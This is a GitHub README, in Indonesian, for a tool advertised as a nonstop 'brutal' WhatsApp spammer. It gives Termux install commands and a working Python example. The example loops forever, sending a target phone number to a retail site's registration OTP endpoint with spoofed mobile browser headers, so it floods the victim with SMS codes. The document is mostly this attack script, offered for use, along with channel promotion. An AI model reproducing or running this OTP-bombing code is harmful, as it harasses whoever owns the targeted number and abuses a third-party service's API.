## Tools-WhatsApp
Spam Brutal WhatsApp 24 jam non stop

<details open>
  <summary><strong> Install Package + Run Script </strong></summary>

  ```bash
  pkg update && pkg upgrade
  pkg install nano
  pkg install git
  pkg install python
  git clone https://github.com/AmmarrBN/Tools-WhatsApp
  bash install.sh
  cd Tools-WhatsApp
  python main.py
  ```
  </details>

<details open>
  <summary><strong> 24 jam non stop tutorial </strong></summary>

  ```bash
  Example:
  import os,sys,time,requests,json
  abc=input("Nomor Target:")
  while True:
        print (abc)
        # Tambah time.sleep(5) (Jika Ingin Delay)
  ```
  </details>

#### KELEBIHAN 📍
| Kelebihan | Check |
|--------|--------|
| **24 Jam non stop** |[✔️](https://github.com/AmmarrBN) |
| **Brutal Spam** |[✔️](https://github.com/AmmarrBN) |
| **Simple** |[✔️](https://github.com/AmmarrBN) |
| **No Encrypt** |[✔️](https://github.com/AmmarrBN) |
| **Subscribe** |[Here](https://youtube.com/channel/UCyyIDnXYJlRI_-2pAQqKr0g) |
---------

<details open>
  <summary><strong> 24 jam non stop example </strong></summary>

  ```bash
  import os,sys,time,requests,json
  nomor=input("Nomor Target:")
  while True:
        requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"account":nomor})).text
        time.sleep(10) # Waktu Delay Bisa Atur Sendiri
  ```
  </details>

> SUBSCRIBE MY CHANNEL >_<

[![](https://img.shields.io/static/v1?logo=youtube&label=subscribe&message=Ammar%20Executed&color=green)](https://youtube.com/channel/UCFeZ5BGt8lbOZwIj2MNOlIQ)
[![](https://img.shields.io/static/v1?logo=youtube&label=subscribe&message=Ammar%20Executed&color=green)](https://youtube.com/channel/UCFeZ5BGt8lbOZwIj2MNOlIQ)

